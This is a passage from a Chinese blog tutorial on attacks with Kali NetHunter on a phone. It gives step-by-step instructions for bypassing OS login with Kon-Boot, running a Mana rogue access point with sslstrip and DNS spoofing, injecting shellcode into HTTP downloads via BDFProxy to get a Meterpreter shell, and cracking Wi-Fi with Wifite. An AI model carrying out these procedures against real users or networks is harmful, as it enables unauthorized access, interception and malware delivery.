<p>这里绕过Windows或OSX登陆认证的镜像为Kon-Boot.可以到官网了解,其原理在于处理BIOS修改系统内核的引导处理,跳过SAM检查,直接登陆系统.因为是付费软件,以下以自行寻觅的镜像为例演示.</p>

<p>关闭MTP文件传输,打开DriveDroid,自动列出images目录下得镜像文件.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01410.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014[10]" border="0" alt="clip_image014[10]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01410_thumb.png" width="1084" height="1924"></a></p>

<p>选择Kon-Boot.img镜像挂载,模式这里选择为Read-Only USB</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01510.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image015[10]" border="0" alt="clip_image015[10]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01510_thumb.png" width="1084" height="1924"></a></p>

<p>加载成功后相应镜像有所标志</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01610.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016[10]" border="0" alt="clip_image016[10]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01610_thumb.png" width="1084" height="1924"></a></p>

<p>而在连入的PC机中也会显示加载有新的可移动磁盘(或软驱盘),如未能显示,可在配置页面进行相应调整(可通过USB Setup Wizard向导指引)</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0179.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017[9]" border="0" alt="clip_image017[9]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0179_thumb.png" width="1084" height="1924"></a></p>

<p>此时在设有密码的PC机重启,进入BIOS设置启动项</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image018.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018" border="0" alt="clip_image018" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image018_thumb.jpg" width="3268" height="2452"></a></p>

<p>如果镜像加载成功,可以看到飞奔的图案如下:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image019.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019" border="0" alt="clip_image019" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image019_thumb.jpg" width="3268" height="2452"></a></p>

<p>之后登陆用户密码处回车即可绕过密码认证登陆系统</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image020.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020" border="0" alt="clip_image020" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image020_thumb.jpg" width="3268" height="2452"></a></p>

<p>需要说明的是,通过此方式登陆系统无法直接修改或删除系统密码.</p>

<h3>0x09 WarDriving</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>犹记得当年前辈们肩扛笔记本做WarDriving的事迹,智能设备发展至今,WarDriving已可用便携设备取代.只是至今迟迟没有寻觅到比较合适直观的WarDriving工具,期待有朋友能开发或推荐个.</p>

<p>在NetHunter下,Kali-Menu的Wireless模块中Kismet作为WarDriving的默认工具,不过操作起来画面太美不敢看:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0217.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image021[7]" border="0" alt="clip_image021[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0217_thumb.png" width="1084" height="1924"></a></p>

<p>退而求其次,推荐使用App WigleWifi.不过注</p>

<p>意不要不小心上传数据.使用easy,界面很难看.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00121.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[21]" border="0" alt="clip_image001[21]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00121_thumb.png" width="1084" height="1924"></a></p>

<p>好在数据可以以Sqlite数据库格式存储在本地.</p>

<h3>0x10 Mana EvilAP蜜罐</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>想建个CMCC无线网络钓鱼劫持流量?PineApple没有带在身边,不妨拿出手机,开个蜜罐吧. :)</p>

<p>Mana蜜罐采用与PineApple相同的:Hostapd的Karma补丁,可用来欺骗接入无线网络用户，使其可很平滑连接到虚假AP中，进行后续攻击.</p>

<p>需要说明的是,NetHunter无线攻击模块,大都需要使用OTG外接USB无线网卡.主流芯片(可以试试Kali是否可直接识别)网卡均可.WN722N较为推荐,迷你的EDUP网卡通用性则较强(Raspberry Pi也可直接识别),只是信号强度..自然可想而知.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image002.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image002_thumb.jpg" width="3268" height="2452"></a></p>

<p>Mana蜜罐有多种Hacking模式,均为sh脚本,可自由定制.Mana工具安装目录为:</p>

<pre><code>/usr/share/mana-toolkit</code></pre>

<p>启动脚本则在此处存放:</p>

<pre><code>/usr/share/mana-toolkit/run-mana</code></pre>

<p>截获流量文件存放于:</p>

<pre><code>/var/lib/mana-toolkit</code></pre>

<p>通过NetHunter Home的Mana蜜罐页面可方便的对配置文件进行修改:</p>

<p>Hostapd配置文件</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00321.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[21]" border="0" alt="clip_image003[21]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00321_thumb.png" width="1084" height="1924"></a></p>

<p>DHCP服务配置文件</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00420.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[20]" border="0" alt="clip_image004[20]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00420_thumb.png" width="1084" height="1924"></a></p>

<p>DNS欺骗配置文件</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00517.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[17]" border="0" alt="clip_image005[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00517_thumb.png" width="1084" height="1924"></a></p>

<p>服务启动脚本有多个,均可自由编辑修改:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00617.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[17]" border="0" alt="clip_image006[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00617_thumb.png" width="1084" height="1924"></a></p>

<p>上图对应脚本start-nat-full.sh,脚本需要USB无线网卡(存在上行流量)启动,无线连入为NAT模式,并启动所有脚本包括:firelamb,sslstrip,sslsplit等,截获流量并保存.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00717.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[17]" border="0" alt="clip_image007[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00717_thumb.png" width="1084" height="1924"></a></p>

<p>start-nat-simple.sh同样有上行流量,但并不启动firelamb,sslstrip,sslsplit等脚本.</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00817.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[17]" border="0" alt="clip_image008[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00817_thumb.png" width="1084" height="1924"></a></p>

<p>start-nat-simple-bdf.sh,加入了BDF恶意代码Inject工具,后面章节将对其攻击思路进行介绍.</p>

<p>此外,还有</p>

<p>start-noupstream.sh</p>

<pre><code>Mana</code><code>作为无法上网的虚假</code><code>AP</code><code>启动</code><code>,</code><code>但可吸引</code><code>WIFI</code><code>默认开启的终端自动连接并抓取信息</code><code>.</code></pre>

<p>start-noupstream-eap.sh</p>

<pre><code>Mana</code><code>同样无法上网</code><code>,</code><code>但会进行</code><code>EAP</code><code>攻击</code><code></code></pre>

<p>编辑好启动文件后,Start Attack,会弹窗勾选启动脚本:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00915.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009[15]" border="0" alt="clip_image009[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00915_thumb.png" width="1084" height="1924"></a></p>

<p>即可启动服务.</p>

<h3>0x11 Backdooring Executable Over HTTP</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>这个攻击思路就比较有趣了,新功能在NetHunter今年1月5号发布的版本中作为Kali Nethunter目前最新最酷炫的玩法,源于<a href="https://github.com/secretsquirrel/" target="_blank" rel="external">secret squirrel</a>的github项目<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">the-backdoor-factory</a>和<a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="external">BDFProxy</a>,可让我们轻松地对使用HTTP协议传送的二进制文件注入shellcode.</p>

<p>首先建立一个Mana蜜罐，SSID这里使用默认名称internet,启动服务</p>

<pre><code>cd /usr/share/mana-toolkit/run-mana</code></pre>

<pre><code>./start-nat-simple-bdf.sh</code></pre>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01015_3.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[15]" border="0" alt="clip_image010[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01015_thumb.png" width="964" height="544"></a></p>

<p>再开一个Shell,编辑bdfproxy.cfg,此配置文件包含了针对不同平台默认设置的payload,可自行更换.不过由于显示问题,用nano编辑文本会一行行刷新,还是换个方式编辑比较好.这里只把IP修改192.168.1.151,也可在Nethunter的主面板下的MANA Evil Access Point中进行配置.</p>

<pre><code>nano /etc/bdfproxy/bdfproxy.cfg</code></pre>

<p>配置好IP之后,在Shell中直接输入bdfproxy运行之.</p>

<p>再新开一个Shell启动Metasploit</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01113.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image011[13]" border="0" alt="clip_image011[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01113_thumb.png" width="964" height="544"></a></p>

<p>一切准备就绪,等待连入蜜罐AP的PC机上网下载二进制文件,在此通过百度下载everything(神器啊)演示:</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image012.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image012_thumb.jpg" width="854" height="452"></a></p>

<p>运行everthing,因为注入了payload,会出现自校验失败的提示</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01313.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image013[13]" border="0" alt="clip_image013[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01313_thumb.png" width="964" height="604"></a></p>

<p>查看MSF,已成功反弹回Shell了.而上面自校验失败的提示就是MeterPreter的screenshot帮我截取的 :)</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01412.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014[12]" border="0" alt="clip_image014[12]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01412_thumb.png" width="964" height="544"></a></p>

<p>不得不说,这个新特性真的很Cool.</p>

<h3>0x12 Wifite破解</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>写到最后,还没有提到无线破解是不科学的;) NetHunter推荐的Wifite破解工具是其最早集成的功能之一.移动设备的便携性更有利于随时随地进行Wifi安全测试,只需挂载上外置无线网卡便可轻松抓包破解.不过并不建议直接在移动设备上破解抓到的包,如跑几分钟没结果,就拿高性能设备破解吧,否则易导致设备死机.</p>

<p>连接好外置无线网卡后,在Nethunter主菜单选择Launch Wifite即可进入</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image015.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image015" border="0" alt="clip_image015" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image015_thumb.jpg" width="3268" height="2452"></a></p>

<p>选择开启混杂监听模式的网卡,选择Wlan1</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image016.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image016_thumb.jpg" width="955" height="511"></a></p>

<p>扫描开始,每5秒更新一次,当确认攻击目标后CTRL+C停止扫描</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01711.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017[11]" border="0" alt="clip_image017[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01711_thumb.png" width="964" height="544"></a></p>

<p>输入攻击目标序号,这里就选<code>XDSEC-WIFI</code>了,输入2</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0187.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018[7]" border="0" alt="clip_image018[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0187_thumb.png" width="964" height="544"></a></p>

<p>抓包成功后自动调用字典破解,这里机智的把字典删掉,其自动退出</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0197.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019[7]" border="0" alt="clip_image019[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0197_thumb.png" width="964" height="544"></a></p>

<p>抓到的握手包存放在/data/local/kali-armhf/HS目录下,命名规则是SSID+MAC</p>

<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0207.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020[7]" border="0" alt="clip_image020[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0207_thumb.png" width="964" height="544"></a></p>

<p>如果目标开启WPS,则自动进行PIN码破解.</p>

<p>Wifite相对傻瓜化,易操作,适合移动终端.对无线网密码测试笔者也成功过几次,连入无线后结合zANTI等工具调戏即可:)</p>

<h3>0x13 写在最后</h3>

<hr align="left" size="5" width="100%" noshade="noshade">

<p>文末,已将NetHunter大部分实战玩法进行相应介绍,文章为卷毛<a href="http://drops.wooyun.org/author/zing" target="_blank" rel="external">zing</a>同学与顺毛le4f同学共同编写,能力有限,如有不足之处望指出.抛砖引玉,期待有更多技巧分享.</p>

<p>via <a title="http://drops.wooyun.org/tips/4634" href="http://drops.wooyun.org/tips/4634" target="_blank" rel="external">http://drops.wooyun.org/tips/4634</a></p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1103.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1103.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1103.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1103.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/1104.seo/">
        ← 2014 新增热门软件排行榜 TOP 100(开源中国)
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/1102.seo/">
        How To Find User's SIDs with WMIC →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
